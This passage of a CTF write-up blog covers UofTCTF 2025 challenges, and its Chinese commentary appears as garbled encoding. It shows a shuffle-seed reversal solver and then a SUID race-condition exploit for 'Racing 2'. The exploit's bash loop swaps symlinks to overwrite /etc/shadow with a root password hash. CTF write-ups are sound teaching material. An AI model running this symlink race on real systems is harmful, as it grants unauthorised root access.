<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">initial: [1, 2, 3, 4, 5]</span><br><span class="line">87 % 5 == 2 -&gt; pop 3 -&gt; [1, 2, 4, 5]</span><br><span class="line">17 % 4 == 1 -&gt; pop 2 -&gt; [1, 4, 5]</span><br><span class="line">4 % 3 == 1 -&gt; pop 4 -&gt; [1, 5]</span><br><span class="line">1 % 2 ==1 -&gt; pop 5 -&gt; [1]</span><br><span class="line">0 % 1 ==0 -&gt; pop 1 -&gt; []</span><br></pre></td></tr></table></figure>
<p>é‚£ä»Šå¤©å·²çŸ¥æ´—ç‰Œçµæœçš„æƒ…æ³ï¼Œåªè¦ç¨®å­ &lt; n!ï¼Œn æ˜¯ç‰Œæ•¸å°±å¯ä»¥é€†æ¨ç¨®å­<br>å›åˆ°å‰›å‰›çš„ç¯„ä¾‹ï¼Œä»Šå¤© 3 è¢«ç¬¬ä¸€å€‹ pop å‡ºä¾†æ™‚æˆ‘å€‘çŸ¥é“ ç¨®å­ &#x3D; <code>X*5+2</code>ï¼Œä»¥æ­¤é¡æ¨ï¼Œå¾Œé¢çš„ X åˆå¯ä»¥éé€²åœ°è¢«ä¸€ä¸€åˆ—å‡ºä¾†ï¼Œæœ€å¾Œå°±å¯ä»¥é€†æ¨å›å»äº†<br>reverse_shuffle  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_shuffle</span>(<span class="params">shuffled_nums</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(shuffled_nums)</span><br><span class="line">    original_indices = []</span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> shuffled_nums:</span><br><span class="line">        index = nums.index(num)</span><br><span class="line">        original_indices.append(index)</span><br><span class="line">        nums.pop(index)</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        seed = seed * (n - i) + original_indices[i]</span><br><span class="line">    <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°é€™å…©å€‹ Hint  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;initial_y &lt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> &lt; initial_x &lt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> &lt; k &lt; <span class="number">100</span></span><br><span class="line">y_hint1 = initial_y * Fraction(<span class="string">f&#x27;<span class="subst">&#123;<span class="number">2</span>**k - <span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="number">2</span>**k&#125;</span>&#x27;</span>) * (<span class="number">2</span> ** k)</span><br><span class="line">x_hint1 = initial_x * Fraction(<span class="string">f&#x27;<span class="subst">&#123;<span class="number">2</span>**k - <span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="number">2</span>**k&#125;</span>&#x27;</span>) * (<span class="number">2</span> ** k)</span><br><span class="line"><span class="keyword">assert</span> y_hint1.denominator == <span class="number">1</span> <span class="keyword">and</span> x_hint1.denominator == <span class="number">1</span></span><br><span class="line">y_hint2 = <span class="built_in">int</span>(<span class="built_in">bin</span>(y_hint1.numerator)[:<span class="number">1</span>:-<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line">x_hint2 = <span class="built_in">int</span>(<span class="built_in">bin</span>(x_hint1.numerator)[<span class="number">2</span>:], <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€å€‹ Hint æ˜¯å‘ŠçŸ¥æ•¸å­—é‡ç´šä»¥åŠåˆ†æ¯æ˜¯ $2^k-1$ çš„å› æ•¸<br>ç¬¬äºŒå€‹å‰‡æ˜¯ä¸€å€‹ä½å…ƒé—œä¿‚ï¼Œå¯¦éš›æ¨¡æ“¬ä¸€é or ç”¨ä½å…ƒæƒ³ä¸€ä¸‹å°±æœƒç™¼ç¾ Bake å‡½æ•¸åœ¨åˆå§‹å€¼å¤ å¤§æ™‚ï¼Œéå¹¾æ¬¡æ“ä½œå¾Œå°±æœƒæŠŠx, y å…©å€‹æ•¸å­—çµ¦äº¤æ›ï¼Œé€™æ™‚å€™ç”¢å‡ºçš„éš¨æ©Ÿæ•¸åˆæœƒæ˜¯ä¸€æ¨£çš„äº† (é€™é‚Šå› ç‚º k &lt; 100 æ‰€ä»¥ <code>2**100</code> æ˜¯è¶³å¤ çš„)  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Bake</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">1</span> / <span class="number">2</span>:</span><br><span class="line">        x, y = x / <span class="number">2</span>, <span class="number">2</span> * y</span><br><span class="line">    <span class="keyword">elif</span> y &gt;= <span class="number">1</span> / <span class="number">2</span>:</span><br><span class="line">        x, y = <span class="number">1</span> - x / <span class="number">2</span>, <span class="number">2</span> - <span class="number">2</span> * y</span><br><span class="line">    <span class="keyword">return</span> x,y </span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œè—‰ç”±é€™å€‹å¾ªç’°å°±èƒ½æŠŠä¸€é–‹å§‹æ‹¿å» AES åŠ å¯†çš„ Key çµ¦ç®—å‡ºä¾†  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Connect Info:</span></span><br><span class="line"><span class="string">nc 34.66.202.4 5000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_shuffle</span>(<span class="params">shuffled_nums</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(shuffled_nums)</span><br><span class="line">    original_indices = []</span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> shuffled_nums:</span><br><span class="line">        index = nums.index(num)</span><br><span class="line">        original_indices.append(index)</span><br><span class="line">        nums.pop(index)</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        seed = seed * (n - i) + original_indices[i]</span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;34.66.202.4&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">appeared=&#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = []</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">found=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;! &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;30&#x27;</span>)</span><br><span class="line">    data=r.recvline().decode()</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">f&quot;cur=reverse_shuffle(<span class="subst">&#123;data&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cur <span class="keyword">in</span> appeared:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Hooray&#x27;</span>)</span><br><span class="line">        found=<span class="literal">True</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">f&quot;dict.append(<span class="subst">&#123;cur&#125;</span>);appeared.add(<span class="subst">&#123;cur&#125;</span>)&quot;</span>)</span><br><span class="line">    os.system(<span class="string">f&#x27;echo <span class="subst">&#123;cur&#125;</span> &gt;&gt; log.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> found==<span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘æ˜¯å¾ log.txt å»æŠŠå€¼æ’ˆå‡ºä¾†çš„ LOL  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">key=sha256(long_to_bytes(<span class="number">502862720484858228125774457433</span>)).digest()</span><br><span class="line">secret=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;e38a86c361718fdc984d5d2cecd1b15ba5340428ec36575427af032356a386fbe119c0a579d598b30914408b9420c2c9&#x27;</span>)</span><br><span class="line">cipher=AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(secret))</span><br><span class="line"><span class="comment"># b&#x27;uoftctf&#123;Intr0ductioN_2_dyNam1cal_sYst3m_&amp;_cha05&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è§£å¯†çš„éƒ¨åˆ†  </p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Racing-2"><a href="#Racing-2" class="headerlink" title="Racing 2"></a>Racing 2</h3><p>æœ‰ä¸€æ”¯ SUID Binary chalï¼Œè¦åšææ¬Š  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *fn = <span class="string">&quot;/home/user/permitted&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!access(fn, W_OK))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter text to write: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, buffer);</span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot write to file.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°ä¸€é–‹å§‹æœƒå…ˆæª¢æŸ¥ç•¶å‰æ˜¯å¦æœ‰ &#x2F;home&#x2F;user&#x2F;permitted å¯«å…¥æ¬Šé™å¾Œï¼Œå†æ ¹æ“šä½¿ç”¨è€…è¼¸å…¥å¯«å…¥æª”æ¡ˆ<br>é€™ä¸­é–“å°±æœ‰æ™‚é–“å·®å»åš Race Conditionï¼Œåªè¦å»ºç«‹ symlink è®“å®ƒä¸€ä¸‹æŒ‡å‘ä¸€èˆ¬å…·å¯«å…¥æ¬Šé™çš„æª”æ¡ˆï¼Œä¸€ä¸‹è®“å®ƒæŒ‡å‘ &#x2F;etc&#x2F;shadowï¼Œå°±æœ‰æ©Ÿæœƒè®“æª¢æŸ¥æ™‚è®€å–åˆ°å‰è€…ï¼Œå¯«å…¥æ™‚è®€å–åˆ°å¾Œè€…<br><strong>Command</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> /home/user/whale</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">ln</span> -sf /home/user/whale /home/user/permitted ; <span class="built_in">ln</span> -sf /etc/shadow /home/user/permitted; <span class="keyword">done</span> &amp;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">printf</span> <span class="string">&#x27;root:$y$j9T$59Q4D77.2KEh1oee7.i..1$PD1XNBwmU8o2DxJzKatgmlAA0QhicizAklwnuA5OME9:19871:0:99999:7:::&#x27;</span> | /challenge/chal &gt;/dev/null; <span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
<p>&#x2F;etc&#x2F;shadow æˆ‘å¯«å…¥çš„æ˜¯ kali å¯†ç¢¼ hash ğŸ˜œ<br><img src="https://hackmd.io/_uploads/SkWIY4Gvyl.png" alt="image">  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prismatic-Blogs"><span class="toc-number">2.1.</span> <span class="toc-text">Prismatic Blogs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CodeDB"><span class="toc-number">2.2.</span> <span class="toc-text">CodeDB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1337-v4ul7"><span class="toc-number">2.3.</span> <span class="toc-text">1337 v4ul7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enchanted-Oracle"><span class="toc-number">3.1.</span> <span class="toc-text">Enchanted Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shuffler"><span class="toc-number">3.2.</span> <span class="toc-text">Shuffler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Racing-2"><span class="toc-number">4.1.</span> <span class="toc-text">Racing 2</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/01/13/uoftctf-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&text=UofTCTF 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&is_video=false&description=UofTCTF 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UofTCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/01/13/uoftctf-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&title=UofTCTF 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/01/13/uoftctf-2025/&name=UofTCTF 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/01/13/uoftctf-2025/&t=UofTCTF 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
